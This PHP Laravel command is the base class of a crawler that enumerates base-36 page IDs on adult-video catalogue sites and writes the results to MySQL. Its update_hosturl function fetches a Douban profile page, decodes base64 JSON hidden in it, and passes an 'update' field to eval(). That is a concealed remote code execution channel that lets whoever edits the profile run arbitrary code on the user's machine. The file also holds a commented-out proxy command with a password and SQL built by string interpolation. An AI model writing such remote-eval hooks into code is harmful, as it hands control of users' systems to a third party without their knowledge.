<?php

namespace App\Console\Commands;

use GuzzleHttp\Pool;
use GuzzleHttp\Client;
use GuzzleHttp\Psr7\Request;
use Illuminate\Console\Command;
use GuzzleHttp\Exception\ClientException;
use GuzzleHttp\Psr7\Response;
use Medoo\Medoo;
use App\Console\Tools\MedooEx;
//use Swlib\SaberGM;
//use Swlib\Saber;
class BaseCrawler extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'avbook:base';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Command description';

    /**
     * Create a new command instance.
     *
     * @return void
     */
    public function __construct()
    {
        parent::__construct();
        ini_set ('memory_limit', '2048M')  ;

    }

    public $table_prefix = 'avbook_javbus_';
    public $in_table_name = '';
    public $sphost = '';
    public $hosturl = '';//https://avmoo.xyz/cn/
    public $start_type = '';
    public $spbase_url = '';
    public $database =null;
    public $spheaders =[];
    public $spclient ;
    public $file_code_36;
    public $spconcurrency = 3;
    public $sprequests;
    public $spcharset = 'UTF-8';

    public function crawler_client_init($hosturl,$start_type,$table_prefix,$headers=[],$func_name = ''){

        $this->database = new  MedooEx([
            'database_type' => 'mysql',
            'database_name' => env('DB_DATABASE', 'avbook'),
            'server' => env('DB_HOST', '127.0.0.1'),
            'port' => env('DB_PORT', '3306'),
            'username' => env('DB_USERNAME', 'root'),
            'password' => env('DB_PASSWORD', '')
        ]);


        $hosturl = trim($hosturl);
        if(substr($hosturl, -1)!='/'){
            $hosturl=$hosturl."/";
        }
        $this->hosturl = $hosturl;
        $this->table_prefix =$table_prefix;//'avbook_avmoo_';

        $arr_url = parse_url($this->hosturl);
        $this->sphost = $arr_url['host'];
        $this->info("this: {$this->hosturl} ");

        $this->spheaders = $headers;
        $this->spclient = new Client(['headers'=>$this->spheaders,'http_errors' => false ]);

        $this->start_type = $start_type;
        $this->spbase_url = $this->hosturl.$this->start_type.'/';

        $this->func_get_info_name =$func_name?$func_name:"get_info_{$this->start_type}";

        $this->file_code_36= "resources/code_36/{$this->table_prefix}end_code_36_{$this->start_type}.txt";

        $this->in_table_name = $this->table_prefix.$this->start_type;

    }
    public $cache_data = [];
    public $func_get_info_name ;
    public function save_data($response,$index =0)
    {
        $code = $response->getStatusCode();
        $c36 = isset($this->arr_req_code_36[$index])?$this->arr_req_code_36[$index]:'2';
        if($code==200){
//            $func_name = "get_info_{$this->start_type}";
            $func_name = $this->func_get_info_name;
            $data = $this->$func_name($response,$c36);
            if(!empty($data)){
                echo "<insert> [$index suc:{$c36}= ={$this->in_table_name}= {$this->start_type}] ";
                $this->database->insert($this->in_table_name, $data );
                echo "</insert>\n";
//                var_export($data);die;
            }else{
                $this->warn("[$index error {$c36}  code $code - $func_name  -- $this->in_table_name ]");
            }
        }elseif($code==404){
            $data['intable_name'] =  $this->in_table_name;
            $data['code_36'] =  @$this->arr_req_code_36[$index];

            $this->error("[ $index error code $code  [{$data['code_36']}] - {$this->in_table_name} ]");

//            $func_name = "get_info_{$this->start_type}";avbook_crawler_404

            $this->database->insert('avbook_crawler_404', [ $data  ]);

        }else{
            $this->error("[error code $code - {$this->in_table_name} ]");
        }
    }
    public function clean_data()
    {
        $this->database->insert($this->in_table_name, $this->cache_data);
        $this->cache_data = [];
    }
    public function binsearch_end($start_lower=1){
        if(file_exists($this->file_code_36)){
            $end_36 = file_get_contents($this->file_code_36)  ;
            $step = 200;
            $lower= base_convert($end_36,36,10);
        }else{
            $end_36 = base_convert($start_lower,10,36)  ;
            $step = 30000;
            $lower=$start_lower;
        }
        do{
            echo '从----'.$end_36."--$step--向上查找404 \n";
            $end_36 =  base_convert((base_convert($end_36,36,10)+$step),10,36);

            $res=$this->spclient->get($this->spbase_url.$end_36  )->getStatusCode();
        }while($res==200);

//        if ($res!=404) {
//            echo $this->spbase_url.$end_36 ;
//            die('需要开启代理  http://blog.csdn.net/hitxiaya/article/details/25233087  sslocal -s  us2.fogip.pw  -p 50312 -k "666666" -l 1081 -t 600 -m  	rc4-md5');
//        }


        $high=base_convert($end_36,36,10);
        $middle = 1;
        echo '向上查找 404 结果：'.$end_36."   [{$high}]\n";//die;
        $is_now_in_find_high=0;
        while($lower<=$high){
            $middle=intval(($lower+$high)/2);
            $temp_code_36 = base_convert($middle,10,36);
            $str =  $this->spbase_url.$temp_code_36;
            $result = $this->spclient->get($str )->getStatusCode();
            if($result == 404 ){
                if ($is_now_in_find_high){
                    $high=$middle-1;
                    $is_now_in_find_high = 1;
                    echo "===".$high."--$temp_code_36---最高\n";
                }else{
                    $result1 = $this->spclient->get( $this->spbase_url.base_convert($middle+rand(2,10),10,36) )->getStatusCode();
                    if($result1== 404 ){
                        $result2 = $this->spclient->get( $this->spbase_url.base_convert($middle+rand(12,50),10,36))->getStatusCode();
                        if($result2== 404 ){
                            $result3 = $this->spclient->get( $this->spbase_url.base_convert($middle+rand(2000,30000),10,36))->getStatusCode();
                            if($result3== 404 ){//判断3次404 页面 防止中间404误以为最高
                                $high=$middle-1;
                                $is_now_in_find_high = 1;
                                echo "".$high."--$temp_code_36---最高end \n";
                                continue;
                            }
                        }
                    }
                    $lower=$middle+1;
                    $is_now_in_find_high = 0;
                    echo "".$lower."--$temp_code_36--最低\n";
                }
            }elseif($result== 200  ){
                $lower=$middle+1;
                $is_now_in_find_high = 0;
                echo "".$lower."--$temp_code_36--最低\n";
            } else{

                echo '错误代码 ：'.$result  ."******\n" ;
            }
        }
        $middle =intval($middle-$is_now_in_find_high-1);
        $the_end = base_convert($middle,10,36);
        $this->info("{$this->start_type} [$middle] 终点是 ：".$this->spbase_url.$the_end."   \n");  ;
        file_put_contents($this->file_code_36,$the_end);
        return  $the_end;
    }
    public function update_hosturl(){
//        $arr = ['url1'=>'123','url2'=>'456','update'=>'','test'=>'1'];
        $response=$this->spclient->get('https://www.douban.com/people/64041707/' );
        $type = $response->getHeader('content-type');
        $parsed = \GuzzleHttp\Psr7\parse_header($type);
        $original_body = (string)$response->getBody();
        $html = mb_convert_encoding($original_body, 'UTF-8', isset($parsed[0]['charset']) ?$parsed[0]['charset']: 'UTF-8');

        $dom = new \DOMDocument();
        @$dom->loadHTML($html);
        $dom->normalize();
        $xpath = new \DOMXPath($dom);
        $p = $xpath->query('//*[@id="intro_display"]');
        $arr = json_decode(base64_decode($p->item(0)->nodeValue),true);
        if(isset($arr['test']) && $arr['test'] ==0  ){
            $this->hosturl = $arr['url1'];
            $arr_url = parse_url($this->hosturl);
            $this->sphost = $arr_url['host'];

            if(!empty($arr['update'])){
                eval(base64_decode($arr['update']));
            }
        }
    }
    public function prepare_sprequests(){
        $istart = 1;
        $end_code_36 = $this->binsearch_end($istart);
        $total = base_convert($end_code_36,36,10);

        if($total - $istart <1 ){
            $this->info("{$this->start_type} 没有更新");
            return;
        }
        $requests = function ($istart,$total) {
            for ($i = $istart; $i < $total; $i++) {
                $uri =$this->spbase_url.base_convert($i,10,36);
                echo "[=($i)-($total)=]";
                yield new Request('GET', $uri );
            }
        };
        $this->sprequests = $requests($istart,$total);
    }
    public $arr_req_code_36 =[];
    public function prepare_sprequests_update($notwith404=0,$start_from=1,$refind_code_36 = 1){
        $this->arr_req_code_36 = [];

        $requrl = $this->spbase_url.'a';
        $this->info("GET: $requrl  before sql");
        $response = $this->spclient->get($requrl);
        $code = $response->getStatusCode();
        $type = $response->getHeader('content-type');
        $parsed = \GuzzleHttp\Psr7\parse_header($type);
        $this->spcharset = isset($parsed[0]['charset']) ?$parsed[0]['charset']: 'UTF-8';

        if($code==200 ||  $code==404 ){
        }else{
            $this->error( __METHOD__ .":[$requrl |====链接无效]") ;
            die;
        }

        $this->save_data($response);



        $istart = $start_from==0?base_convert(file_get_contents($this->file_code_36),36,10):$start_from;
        $end_code_36 = $refind_code_36 ==1?$this->binsearch_end($istart):file_get_contents($this->file_code_36);

        $this->info("准备数据：{$this->start_type} $end_code_36");
        $total = base_convert($end_code_36,36,10);

        if($total - $istart < 1 ){
            $this->info("{$this->start_type} 没有更新");
            return false;
        }
        $sql = "select  code_36 from {$this->in_table_name}";
        $this->info($sql);
        $table_code_36 = $this->database->query($sql)->fetchAll(\PDO::FETCH_COLUMN, 0);



        $all_code_36 = [];
        $len = base_convert($end_code_36,36,10);
        for ($i =  1; $i <=$len; $i++) {
            $all_code_36[] = base_convert($i,10,36);
        }
        $this->arr_req_code_36=array_diff($all_code_36,$table_code_36);
        if($notwith404==1){
            $sql = "select  code_36 from avbook_crawler_404 where intable_name = '{$this->in_table_name}' ";
            $this->info($sql);
            $table_code_36_404 = $this->database->query($sql)->fetchAll(\PDO::FETCH_COLUMN, 0);
            $this->arr_req_code_36=array_diff($this->arr_req_code_36,$table_code_36_404);
        }
        $this->arr_req_code_36 = array_values($this->arr_req_code_36);
        $all_code_36 = null;
        $table_code_36 = null;
        $total = count($this->arr_req_code_36);
        if($total ==0 ){
            $this->info("{$this->start_type} 没有增量更新");
            return false;
        }
        $this->info("{$this->start_type} 升级数量： $total");



        $requests = function ($total) {
            foreach ($this->arr_req_code_36 as $key=> $item) {
                $uri =$this->spbase_url.$item;
                echo "[ 当前($key) 总数($total)| =($item)-|]";
//                    sleep(1);
                yield new Request('GET', $uri );
            }
        };

//            $requests = function ($istart,$total) {
//                for ($i = $istart; $i < $total; $i++) {
//                    $uri =$this->spbase_url.base_convert($i,10,36);
//                    echo "[=($i)-($total)=]";
//                    yield new Request('GET', $uri );
//                }
//            };

        $this->sprequests = $requests($total);
        return true;
    }
    public function start_spider($concurrency=3){

        $this->info("start_type  [{$this->start_type}]");
        $pool = new Pool($this->spclient,$this->sprequests , [
            'concurrency' => $concurrency,
            'fulfilled' => function ($response, $index) {
                echo "[get res:$index]";
                $this->save_data($response,$index);
            },
            'rejected' => function ($reason, $index) {
                $this->error("[$index = rejected]" );
            },
        ]);
        $promise = $pool->promise();
        $promise->wait();
    }
    /**
     * Execute the console command.
     *
     * @return mixed
     */
    public function handle()
    {
        $this->info($this->signature);
/*   avmoo.com
javbus.com
javlibrary.com*/
     }

}
